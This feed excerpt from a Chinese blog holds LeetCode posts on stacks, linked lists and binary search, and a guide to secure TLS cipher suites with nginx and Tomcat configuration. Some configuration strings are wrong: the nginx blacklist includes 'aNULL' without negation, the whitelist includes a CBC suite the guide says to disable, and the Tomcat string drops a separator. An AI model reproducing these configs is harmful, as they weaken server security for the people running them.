class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="复杂度分析-3"><a href="#复杂度分析-3" class="headerlink" title="复杂度分析"></a>复杂度分析</h3><p>时间复杂度：O(n)，其中 n是字符串的长度。我们只需要遍历该字符串一次。</p><p>空间复杂度：O(n) 或 O(1)，取决于使用的语言提供的字符串类是否提供了类似「入栈」和「出栈」的接口。注意返回值不计入空间复杂度。</p><h2 id="5-1021-删除最外层的括号"><a href="#5-1021-删除最外层的括号" class="headerlink" title="5 1021. 删除最外层的括号"></a>5 <a href="https://leetcode-cn.com/problems/remove-outermost-parentheses/">1021. 删除最外层的括号</a></h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>有效括号字符串为空 “”、”(“ + A + “)” 或 A + B ，其中 A 和 B 都是有效的括号字符串，+ 代表字符串的连接。</p><p>例如，””，”()”，”(())()” 和 “(()(()))” 都是有效的括号字符串。<br>如果有效字符串 s 非空，且不存在将其拆分为 s = A + B 的方法，我们称其为原语（primitive），其中 A 和 B 都是非空有效括号字符串。</p><p>给出一个非空有效字符串 s，考虑将其进行原语化分解，使得：s = P_1 + P_2 + … + P_k，其中 P_i 是有效括号字符串原语。</p><p>对 s 进行原语化分解，删除分解中每个原语字符串的最外层括号，返回 s 。</p><p>示例 1：</p><p>输入：s = “(()())(())”<br>输出：”()()()”<br>解释：<br>输入字符串为 “(()())(())”，原语化分解得到 “(()())” + “(())”，<br>删除每个部分中的最外层括号后得到 “()()” + “()” = “()()()”。</p><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>这道题本身并不麻烦，主要是理解这句原语的含义：</p><p>如果有效字符串 s 非空，且不存在将其拆分为 s = A + B 的方法，我们称其为原语</p><p>其实就是每获取一组左右括号相等的搭配后，将左右括号各删除一个，并保存即可。<br>由于这道题目提供的用例都是满足括号匹配关系的内容，使得这道题的难度就更低了。</p><p>我们创建一个字符串用于接收每次获取的原语进行拼接<br>然后创建一个栈，开始循环s，进行栈的入栈操作，每次入栈的是s的下标<br>左括号直接入栈，右括号时弹出栈顶，并判断栈是否为空，为空则代表找到一对匹配内容<br>此时获取栈顶index以及当前循环的下标i，ret += s[left+1:i]（删除最外层的左右括号）即可。</p><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">removeOuterParentheses</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type s: str        :rtype: str        """</span>        ret<span class="token operator">=</span><span class="token string">""</span>        stack<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token comment" spellcheck="true">#记录索引</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token string">'('</span><span class="token punctuation">:</span>                stack<span class="token punctuation">.</span>append<span class="token punctuation">(</span>i<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                left<span class="token operator">=</span>stack<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token operator">not</span> stack<span class="token punctuation">:</span>                    ret<span class="token operator">+=</span>s<span class="token punctuation">[</span>left<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span>        <span class="token keyword">return</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/leetcode/">leetcode</category>
      
      
      <comments>https://m01ly.github.io/2021/07/16/leetcode-stackandqueue/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>安全的TLS协议</title>
      <link>https://m01ly.github.io/2021/07/06/htps-recommend/</link>
      <guid>https://m01ly.github.io/2021/07/06/htps-recommend/</guid>
      <pubDate>Tue, 06 Jul 2021 03:17:11 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在实际应用中，应用不安全的密码协议可能会导致被黑客攻击，因此本文从各个角度给出不同安全级别的密码套件推荐。</p><h2 id="1-算法结构安全性分析"><a href="#1-算法结构安全性分析" class="headerlink" title="1 算法结构安全性分析"></a>1 算法结构安全性分析</h2><p><img src="/2021/07/06/htps-recommend/1625552647924.png" alt="1625552647924"></p><p><strong>1) 密钥交换算法</strong></p><p>密钥交换算法是用于交换对称密钥的公钥系统</p><p>Examples: ECDHE, DHE, RSA, ECDH, DH，ADH，PSK</p><p><strong>RSA，ECDH，DH，PSK均不具有前向安全性</strong>，一旦私钥丢失，则以往所有的通信内容将会泄露，使用前向安全性算法（ECDHE，DHE），可以避免这种问题。</p><p>ADH为Anonymous DH，匿名DH算法，不提供身份验证，禁用。</p><p>PSK算法是预存key在客户端和服务端，因为PSK必须要预置密钥，这个预置的过程就代表了服务端已经知道有哪些客户端需要访问了，所以基于PSK的TLS适合在内部系统中使用，而不适合在公网环境用来提供Web服务。</p><p>另外，因为DH1024 在理论上是可以破解（Logjam攻击）的，虽然破解难度和成本极大，但是也存在一定的风险，所以要求使用DH-2048且 不是初始默认值.</p><p><strong>推荐使用安全密钥交换算法：ECDHE，DHE（2048）</strong></p><p><strong>2）身份认证算法</strong></p><p>服务器在 SSL/TLS 握手中使用的算法来签署（使用服务器的私钥）在协商中发送给客户端的算法。</p><p>客户端可以使用服务器的公钥对它们进行身份验证。</p><p>Examples include: RSA, ECDSA, DSS (aka DSA), and Anonymous.</p><p>DSA只支持1024bits，不安全算法</p><p><strong>推荐使用安全认证算法：</strong>RSA(2048以上)、ECDSA</p><p><strong>3）加密算法</strong></p><p>一种更改消息以使其保密的方法。</p><p>Examples: DES (Data Encryption Standard), 3DES (Triple DES), AES (Advanced Encryption Standard), ChaCha20,RC4 (Rivest Cipher 4), Camellia, ARIA,RC6, RC2, Blowfish, Twofish, IDEA, SEED, GOST, Rijndael, Serpent, MARS, etc.</p><p>ChaCha20是一种流加密算法，实现较为简单，并且比纯软件实现的AES性能更好。</p><p>在支持AES指令的硬件平台上，推荐优先选择AES-GCM算法,不支持AES指令的硬件平台，ChaCha20性能优于AES</p><p>Camellia算法支持128比特的分组长度,128、192和256比特的密钥与AES的接口相同，Camellia算法128比特密钥的加、解密过程共有18轮,采用Feistel结构,加、解密过程完全相同,只是子密钥注入顺序相反</p><p>Camellia算法由NTT和Mitsubishi Electric Corporation于2000年联合开发，作为欧洲新一代的加密标准。与AES算法相比,Camellia算法在各种软硬件平台上表现出与之相当的加密速度。除了在各种软件和硬件平台上的高效性这一显著特点,它的另外一个特点是针对小规模硬件平台的设计</p><p><strong>推荐使用安全的加密算法：</strong>AES256, ChaCha20, Camellia</p><p><strong>4) 密码工作模式</strong></p><p>例如：CBC and GCM</p><p>GCM 代表 Galois/Counter Mode，一种比 CBC 更高级的操作模式。</p><p>它还对困扰 CBC 的攻击类别免疫，例如填充（野兽、幸运 13 等）</p><p>AES-GCM 的主要缺点是它仅在 TLSv1.2 修订版中添加，因此任何不支持 TLSv1.2 的旧客户端都无法使用它。</p><p><strong>推荐使用安全的工作模式</strong>：GCM</p><p><strong>5) MAC(Hash Function)</strong></p><p>简而言之，MAC 提供消息完整性。 散列函数包括 MD5、SHA-1（又名 SHA）、SHA-2（又名 SHA128、SHA256 和 SHA384）和 AEAD（具有关联数据的身份验证加密）。 <strong>MD5 早已变得完全不安全并且已被弃用</strong>。 SHA-1 现在正受到浏览器的“羞辱”，因为它成为加密攻击进步的受害者。 鼓励尽快迁移到 SHA-2。</p><p>SHA1存在碰攻击，如果HTTPS证书使用sha1，则会存在中间人攻击；</p><p><strong>推荐使用安全的Hash算法：</strong>sha256，sha384</p><p>如下几个过时的加密原语必须禁止使用：</p><p>（1）匿名Diffie-Hellman（ADH）套件不提供身份验证。</p><p>（2）NULL加密套件不提供加密。</p><p>（3）导出加密套件在连接协商时不安全，但也可以针对更强大的套件（FREAK攻击）的服务器使用。</p><p>（4）弱密码（通常为40和56位）的套件使用可以轻松被攻击。</p><p>（5）RC4是不安全的。</p><p>（6）3DES运行缓慢且易被攻击。</p><h2 id="2-SSL-TLS协议安全"><a href="#2-SSL-TLS协议安全" class="headerlink" title="2 SSL/TLS协议安全"></a>2 SSL/TLS协议安全</h2><p>SSL/TLS系列中有五种协议：SSL 2，SSL 3，TLS 1.0，TLS 1.1，TLS 1.2和TLS1.3。</p><p>SSL2和SSL3已经非常过时了，建议不要使用。从理论上来讲，TLS 1.0也不应该被使用，但在实践中经常被使用。截至目前，TLS 1.1，1.2和TLS1.3都还没有什么安全问题，但只有 1.2提供了现代的加密算法。所以TLS 1.2应该是被使用的主要协议，因为它是唯一提供现代认证加密（也称为AEAD）的版本</p><p>TLS1.3协议：从2014年4月，第0份TLS 1.3草案公开，到2017年7月第21份草案发布，TLS 1.3的编写工作已经进入尾声，跨时3年的编写，让该协议成为有史以来最安全、也是最复杂的TLS协议。2018年6月15日，IETF发布 TLS v1.3 draft 23，正式的RFC虽然尚未发布，TLS 1.3已经开始被国内外一些网站使用，Chrome、Firefox、OpenSSL、Nginx等均提供了相应支持，TLS 1.3已经悄然进入我们的生活</p><p><strong>推荐使用安全的协议：TLS1.2,TLS1.3</strong></p><h2 id="3-算法套安全级别划分"><a href="#3-算法套安全级别划分" class="headerlink" title="3 算法套安全级别划分"></a>3 算法套安全级别划分</h2><p>算法套的安全级别可以分为高中低三个等级，每个级别的算法套也按安全级别从搞到低排序</p><p><strong>HIGH</strong></p><p>“高级别”加密密码套件。 这目前意味着密钥长度大于 128 位的那些密码套件，以及一些具有 128 位密钥的密码套件。</p><p><strong>MEDIUM</strong></p><p>“中等”加密密码套件，目前其中一些使用 128 位加密。</p><p><strong>LOW</strong></p><p>低强度加密密码套件，目前使用 64 或 56 位加密算法但不包括导出密码套件。 从 OpenSSL 1.0.2g 开始，这些在默认构建中被禁用。</p><h2 id="4-TLS1-2-安全密码套推荐"><a href="#4-TLS1-2-安全密码套推荐" class="headerlink" title="4 TLS1.2 安全密码套推荐"></a>4 TLS1.2 安全密码套推荐</h2><h3 id="4-0-根据证书去选择密码套件"><a href="#4-0-根据证书去选择密码套件" class="headerlink" title="4.0 根据证书去选择密码套件"></a>4.0 根据证书去选择密码套件</h3><p>当服务器配置ECC证书时，加密套件只能选择XXX_ECDSA_XXX或者ECDH_XXX。</p><p>当服务器配置RSA证书时，只能选择RSA_XXX或者ECDHE_RSA_XXX形式的加密套件。</p><p>需要注意的是，如果加密套件选择ECDH_RSA或者ECDH_ECDSA时，由于ECDH加密套件默认表明了握手需要ECC证书（即ECC证书的公钥充当握手中server key exchange中的公钥，证书的私钥同样也是握手过程中的私钥，握手过程不需要server key exchange），所有第二部分RSA和ECDSA表明的是想要的上级签发该类型的服务器证书。</p><p>如果加密套件选择ECDHE_XXXX，则第二部分RSA和ECDSA指的是用来签名握手中server key exchange中传过来的秘密值的签名算法。</p><h3 id="4-1-密码套件选择原则"><a href="#4-1-密码套件选择原则" class="headerlink" title="4.1  密码套件选择原则"></a>4.1  密码套件选择原则</h3><ul><li>支持的SSL/TLS版本：TLS1.2，TLS1.3（禁用SSLV3 TLS1.0和TLS1.1）</li><li>密钥交换算法禁用DH，ADH，优选DHE(2048)和ECHDE，<strong>保留RSA（原则上禁用）</strong></li><li>认证算法使用：RSA和ECDSA，禁用none</li><li>对称加密算法使用：AES, Camellia, ChaCha20, 禁用DES, 3DES, RC4,SEED</li><li>工作模式推荐：AES-GCM， ChaCha20_POLY1305，j禁用CBC</li><li>MAC算法：SHA384，SHA256，禁用SHA1,MD5 </li></ul><h3 id="4-2-TLS1-2-安全密码套件"><a href="#4-2-TLS1-2-安全密码套件" class="headerlink" title="4.2 TLS1.2 安全密码套件"></a>4.2 TLS1.2 安全密码套件</h3><p>针对TLS1.2，推荐以下3种程度安全要求的密码套件：</p><p><strong>(1)TLS1.2密码套件中满足前向安全性，禁用CBC的算法套推荐如下所示</strong></p><p>TLS_DHE_RSA_WITH_AES_128_GCM_SHA256    RSA证书<br>TLS_DHE_RSA_WITH_AES_256_GCM_SHA384    RSA证书<br>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256    RSA证书<br>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384    RSA证书<br>TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256     ecc证书<br>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384     ecc证书</p><p><strong>(2)在1的安全要求下，考虑效率，因为DHE算法效率低，通常不建议。则满足前向安全，禁用CBC，保证高效率推荐的算法套如下所示：</strong></p><p>TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256<br>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384<br>TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256<br>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384</p><p><strong>（3）在（2）的要求基础上，严格意义上128位的加密算法AES并不能保证安全性，对于安全性要求高的，则满足前向安全，禁用CBC，密码长度要求的，保证高效率推荐的算法套如下所示：</strong></p><p>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384<br>TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384</p><h2 id="5-Web服务配置"><a href="#5-Web服务配置" class="headerlink" title="5 Web服务配置"></a>5 Web服务配置</h2><h3 id="5-1-nginx配置"><a href="#5-1-nginx配置" class="headerlink" title="5.1 nginx配置"></a>5.1 nginx配置</h3><p>在安装目录下，修改配置文件</p><p>白名单形式（注意此ciphersuite格式只适用于Nginx,Tomcat的格式是TLS_XXX_XXX_WITH_XXX_XXX_XXX_XXX）：tls1.3加3套tls1.2</p><p>Ssl_ciphers ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES128-SHA:!DSS；</p><p>黑名单形式：</p><p>​    HIGH:aNULL:!ADH:!DH:!DSA:!DES:!3DES:!SEED:!RC4:!MD5:!CBC;</p><p><strong>备注：</strong></p><p>因为nginx是否支持TLS1.3，取决于编译依赖的openssl库是否支持TLS1.3; 且需要重新编译，添加依赖项；所以nginx服务器是否支持TLS1.3的算法套，不仅需要配置还需要编译时加入TLS1.3的依赖。</p><h3 id="5-2-Tomcat配置"><a href="#5-2-Tomcat配置" class="headerlink" title="5.2 Tomcat配置"></a>5.2 Tomcat配置</h3><p>白名单，可以参考配置：</p><p>sslProtocol=”TLSv1.3,TLSv1.2”<br>SSLCipherSuite=”TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,</p><p>TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256，<br>TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256，<br>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,<br>黑名单：</p><p>sslProtocol=”TLSv1.3,TLSv1.2”<br>SSLCipherSuite=”HIGH:!MD5!EXP:!NULL:!ADH:!CBC:!DH:!DSS”</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.microfocus.com/documentation/enterprise-developer/ed60/ES-WIN/GUID-E3960B1E-C42E-4748-A5EB-6E12507C9CD7.html">使用 TLS v1.2 及更早版本配置密码套件列表</a></p><h2 id="附录：所有密码套件"><a href="#附录：所有密码套件" class="headerlink" title="附录：所有密码套件"></a>附录：所有密码套件</h2><p>TLS1.3 密码套件</p><pre><code>TLS13-AES128-GCM-SHA256TLS13-AES256-GCM-SHA384TLS13-CHACHA20-POLY1305-SHA256TLS13-AES128-CCM-SHA256TLS13-AES128-CCM-8-SHA256</code></pre><p>TLS1.2 密码套件</p><pre><code>TLS_RSA_WITH_NULL_SHA256TLS_RSA_WITH_AES_128_CBC_SHA256TLS_RSA_WITH_AES_256_CBC_SHA256TLS_RSA_WITH_AES_128_GCM_SHA256TLS_RSA_WITH_AES_256_GCM_SHA384TLS_DH_RSA_WITH_AES_128_CBC_SHA256TLS_DH_RSA_WITH_AES_256_CBC_SHA256TLS_DH_RSA_WITH_AES_128_GCM_SHA256TLS_DH_RSA_WITH_AES_256_GCM_SHA384TLS_DH_DSS_WITH_AES_128_CBC_SHA256TLS_DH_DSS_WITH_AES_256_CBC_SHA256TLS_DH_DSS_WITH_AES_128_GCM_SHA256TLS_DH_DSS_WITH_AES_256_GCM_SHA384TLS_DHE_RSA_WITH_AES_128_CBC_SHA256TLS_DHE_RSA_WITH_AES_256_CBC_SHA256TLS_DHE_RSA_WITH_AES_128_GCM_SHA256TLS_DHE_RSA_WITH_AES_256_GCM_SHA384TLS_DHE_DSS_WITH_AES_128_CBC_SHA256TLS_DHE_DSS_WITH_AES_256_CBC_SHA256TLS_DHE_DSS_WITH_AES_128_GCM_SHA256TLS_DHE_DSS_WITH_AES_256_GCM_SHA384TLS_ECDH_RSA_WITH_AES_128_CBC_SHA256TLS_ECDH_RSA_WITH_AES_256_CBC_SHA384TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384TLS_ECDH_ECDSA_WITH_AES_128_CBC_SHA256TLS_ECDH_ECDSA_WITH_AES_256_CBC_SHA384TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384TLS_DH_anon_WITH_AES_128_CBC_SHA256TLS_DH_anon_WITH_AES_256_CBC_SHA256TLS_DH_anon_WITH_AES_128_GCM_SHA256TLS_DH_anon_WITH_AES_256_GCM_SHA384</code></pre>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/TLS/">TLS</category>
      
      
      <comments>https://m01ly.github.io/2021/07/06/htps-recommend/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>链表相关</title>
      <link>https://m01ly.github.io/2021/06/28/leetcode-list/</link>
      <guid>https://m01ly.github.io/2021/06/28/leetcode-list/</guid>
      <pubDate>Mon, 28 Jun 2021 03:27:49 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><table><thead><tr><th align="left">题号</th><th align="left">题目</th><th>难度</th></tr></thead><tbody><tr><td align="left">leetcode 21</td><td align="left">合并两个有序链表</td><td>简单</td></tr><tr><td align="left">leetcode 203</td><td align="left">移除链表元素</td><td></td></tr><tr><td align="left">leetcode 206</td><td align="left">反转链表</td><td></td></tr><tr><td align="left">leetcode 141</td><td align="left">环形链表</td><td></td></tr><tr><td align="left">leetcode 86</td><td align="left">分隔链表</td><td></td></tr><tr><td align="left">leetcode 61</td><td align="left">旋转链表</td><td></td></tr><tr><td align="left">剑指 Offer 22</td><td align="left">链表中倒数第k个节点</td><td></td></tr><tr><td align="left">剑指 Offer 52：</td><td align="left">两个链表的第一个公共节点</td><td></td></tr></tbody></table>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/06/28/leetcode-list/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>二分查找相关的题目</title>
      <link>https://m01ly.github.io/2021/05/26/leetcode-binary/</link>
      <guid>https://m01ly.github.io/2021/05/26/leetcode-binary/</guid>
      <pubDate>Wed, 26 May 2021 02:11:11 GMT</pubDate>
      
      <description>&lt;p&gt;二分查找也称折半查找（Binary Search），是一种在有序数组中查找某一特定元素的搜索算法。我们可以从定义可知，运用二分搜索的前提是数组必须是有序的，这里需要注意的是，我们的输入不一定是数组，也可以是数组中某一区间的起始位置和终止位置&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>二分查找也称折半查找（Binary Search），是一种在有序数组中查找某一特定元素的搜索算法。我们可以从定义可知，运用二分搜索的前提是数组必须是有序的，这里需要注意的是，我们的输入不一定是数组，也可以是数组中某一区间的起始位置和终止位置<a id="more"></a></p><h2 id="0-经典二分法"><a href="#0-经典二分法" class="headerlink" title="0 经典二分法"></a>0 经典二分法</h2><p><strong>中间位置的计算：</strong></p><p>mid=left+(right-left)//2或者使用位运算mid=left + ((right - left) &gt;&gt; 1)，注意不能使用 （left + right ）/ 2,否则有可能会导致溢出。</p><p><strong>计算思路：</strong></p><p>二分查找的执行过程如下</p><p>1.从已经排好序的数组或区间中，取出中间位置的元素，将其与我们的目标值进行比较，判断是否相等，如果相等</p><p>则返回。</p><p>2.如果 nums[mid] 和 target 不相等，则对 nums[mid] 和 target 值进行比较大小，通过比较结果决定是从 mid</p><p>的左半部分还是右半部分继续搜索。如果 target &gt; nums[mid] 则右半区间继续进行搜索，即 left = mid + 1; 若</p><p>target &lt; nums[mid] 则在左半区间继续进行搜索，即 right = mid -1；</p><p><strong>注意事项：</strong></p><p>1.while (left &lt; = right) { } 注意括号内为 left &lt;= right ,而不是 left &lt; right ，如果我们设置条件为 left &lt; right 则当我们执行到最后一步时，则我们的 left 和 right 重叠时，则会跳出循环，返回 -1，区间内不存在该元素，但是不是这样的，我们的 left 和 right 此时指向的就是我们的目标元素 ，但是此时 left = right 跳出循环</p><p><strong>代码：</strong></p><p><strong>（1）非递归写法</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearch</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>  mid        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    arr<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">]</span>    res<span class="token operator">=</span>binarySearch<span class="token punctuation">(</span>arr<span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>(2)递归写法</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearchbyRecursion</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>        mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>  mid        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> binarySearchbyRecursion<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一定要记得Return 不然最后都是执行return -1，返回-1</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> binarySearchbyRecursion<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>mid<span class="token number">-1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#一定要记得Return 不然最后都是执行return -1，返回-1 </span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="变形1-无重复-有序"><a href="#变形1-无重复-有序" class="headerlink" title="变形1 无重复 有序"></a>变形1 无重复 有序</h2><h3 id="1-1-LTD35-搜索插入位置"><a href="#1-1-LTD35-搜索插入位置" class="headerlink" title="1.1 LTD35 搜索插入位置"></a>1.1 <a href="https://leetcode-cn.com/problems/search-insert-position/">LTD35 搜索插入位置</a></h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a><strong>题目描述</strong></h4><p>给定一个排序数组和一个目标值，在数组中找到目标值，并返回其索引。如果目标值不存在于数组中，返回它将会被按顺序插入的位置。</p><p>你可以假设数组中无重复元素。</p><p>示例 1:</p><p>输入: [1,3,5,6], 5<br>输出: 2</p><p>示例 2:</p><p>输入: [1,3,5,6], 2<br>输出: 1</p><h4 id="解题："><a href="#解题：" class="headerlink" title="解题："></a><strong>解题：</strong></h4><p>这个题目完全就和咱们的二分查找一样，只不过有了一点改写，那就是将咱们的返回值改成了 left或者mid+1，具体实现过程见下图</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearch</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span>  mid        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">elif</span><span 